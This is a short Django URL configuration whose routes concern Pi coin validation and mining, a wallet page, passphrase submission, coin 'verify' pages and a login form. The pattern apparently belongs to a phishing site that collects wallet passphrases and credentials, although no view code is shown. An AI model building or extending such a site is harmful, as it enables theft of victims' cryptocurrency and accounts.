from django.urls import path
from . import views

urlpatterns = [
    path('', views.index, name='home'),
    path('validatepi/', views.index, name='validatepi'),
    path('minepi/', views.index, name='minepi'),
    path('validate/', views.validate, name='validate'),
    path('wallet/', views.wallet, name="wallet"),
    path('submit/passphase/', views.submit_pass, name="submit_pass"),
    path('approve/', views.approve, name='approve'),
    path('verify/', views.verify_your_coin, name='verify'),
    path('donotverify/', views.do_not_verify, name="donotverify"),

    # login form
    path('login/', views.submitlogins, name='login_form')

]
